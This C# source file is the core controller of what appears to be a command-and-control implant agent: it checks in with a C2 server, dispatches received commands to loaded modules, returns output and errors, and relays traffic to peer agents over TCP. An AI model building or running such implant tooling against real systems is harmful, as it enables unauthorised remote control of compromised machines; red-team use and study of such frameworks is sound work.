using System;
using System.Linq;
using System.Collections.Generic;

using C2.Models;

using Agent.Models;
using Agent.Modules;
using Agent.Interfaces;

namespace Agent.Controllers
{
    public class AgentController
    {
        protected ConfigController ConfigController { get; set; }
        protected ICommModule CommModule { get; set; }
        protected AgentStatus AgentStatus { get; set; }

        public delegate void OnAgentCommand(string data, AgentController agentController, ConfigController configController);
        protected List<AgentModuleInfo> loadedModules = new List<AgentModuleInfo>();

        protected Dictionary<TcpAgent, TCPRelay> tcpRelays = new Dictionary<TcpAgent, TCPRelay>();
        

        internal AgentController(ConfigController ConfigController, ICommModule CommModule)
        {
            this.ConfigController = ConfigController;
            this.CommModule = CommModule;
        }

        internal void Run()
        {
            AgentStatus = AgentStatus.Running;
            CommModule.Run();

            while (AgentStatus == AgentStatus.Running)
            {
                foreach (var relay in tcpRelays.Values)
                    if (relay.GarbageOut(out AgentMessage relayData) == true)
                        CommModule.SendData(relayData);

                if (CommModule.RecvData(out AgentMessage message) == true)
                {
                    var c2Data = C2.Helpers.Deserialise<C2Data>(message.Data);
                    if (string.IsNullOrEmpty(c2Data.AgentId))
                        HandleData(c2Data);
                    else if(!c2Data.AgentId.Equals((string)ConfigController.GetOption(ConfigurationSettings.AgentId), StringComparison.OrdinalIgnoreCase))
                        foreach (var relay in tcpRelays.Values)
                            relay.GarbageIn(message);
                    else
                        HandleData(c2Data);
                }
            }

            foreach (var relay in tcpRelays.Values)
                relay.Stop();
        }

        internal void Stop()
        {
            AgentStatus = AgentStatus.Stopped;
        }

        internal void AddAgentModule(IAgentModule module)
        {
            module.Initialise(this, ConfigController);
        }

        public void RegisterAgentModule(AgentModuleInfo module)
        {
            loadedModules.Add(module);
        }

        internal void InitialCheckIn(InitialMetadata metadata)
        {
            var c2Data = new C2Data
            {
                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                Module = "Core",
                Command = "InitialCheckin",
                Data = Convert.ToBase64String(C2.Helpers.Serialise(metadata))
            };

            var message = new AgentMessage
            {
                AgentId = c2Data.AgentId,
                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
            };

            CommModule.SendData(message);
        }

        public void SendCommandOutput(string data)
        {
            var c2Data = new C2Data
            {
                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                Module = "Core",
                Command = "CommandOutput",
                Data = data
            };

            var message = new AgentMessage
            {
                AgentId = c2Data.AgentId,
                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
            };

            CommModule.SendData(message);
        }

        public void SendModuleData(string module, string command, string data)
        {
            var c2Data = new C2Data
            {
                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                Module = module,
                Command = command,
                Data = data
            };

            var message = new AgentMessage
            {
                AgentId = c2Data.AgentId,
                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
            };

            CommModule.SendData(message);
        }

        public void SendModuleRegistered(AgentModuleInfo module)
        {
            var c2Data = new C2Data
            {
                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                Module = "Core",
                Command = "ModuleRegistered",
                Data = Convert.ToBase64String(C2.Helpers.Serialise(module))
            };

            var message = new AgentMessage
            {
                AgentId = c2Data.AgentId,
                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
            };

            CommModule.SendData(message);
        }

        public void SendError(string module, string command, string data)
        {
            var c2Data = new C2Data
            {
                AgentId = (string)ConfigController.GetOption(ConfigurationSettings.AgentId),
                Module = "Core",
                Command = "AgentError",
                Data = string.Format("{0}|{1}|{2}", module, command, data)
            };

            var message = new AgentMessage
            {
                AgentId = c2Data.AgentId,
                Data = Convert.ToBase64String(C2.Helpers.Serialise(c2Data))
            };

            CommModule.SendData(message);
        }

        public void LinkTCPAgent(string address, int port)
        {
            var tcpAgent = new TcpAgent { Address = address, Port = port };
            var tcpRelay = new TCPRelay(ConfigController);
            tcpRelay.LinkTCPAgent(tcpAgent);
            tcpRelays.Add(tcpAgent, tcpRelay);
        }

        private void HandleData(C2Data data)
        {
            var commands = loadedModules.Where(m => m.Name.Equals(data.Module, StringComparison.OrdinalIgnoreCase)).Select(m => m.Commands).FirstOrDefault();
            if (commands != null)
                commands.Where(c => c.Name.Equals(data.Command, StringComparison.OrdinalIgnoreCase)).Select(c => c.Callback).FirstOrDefault()?.Invoke(data.Data, this, ConfigController);
        }
    }
}